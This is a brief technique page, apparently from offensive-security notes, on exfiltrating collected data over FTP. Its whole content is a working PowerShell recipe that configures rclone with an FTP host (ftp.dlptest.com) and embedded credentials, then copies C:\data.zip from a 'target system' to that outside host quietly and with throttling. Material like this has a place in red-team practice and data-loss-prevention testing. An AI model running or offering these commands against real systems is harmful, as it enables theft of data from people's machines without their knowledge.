# Send Data via FTP

## Over FTP

This command sends a collected data (`data.zip`) to the FTP server (`ftp.dlptest.com`). `rclone.exe` is not a built-in binary, so it must exist on a target system.

```powershell
rclone config create ftpserver "ftp" "host" "ftp.dlptest.com" "port" "21" "user" "dlpuser" "pass" "password123"
rclone copy --max-age 2y C:\data.zip ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
```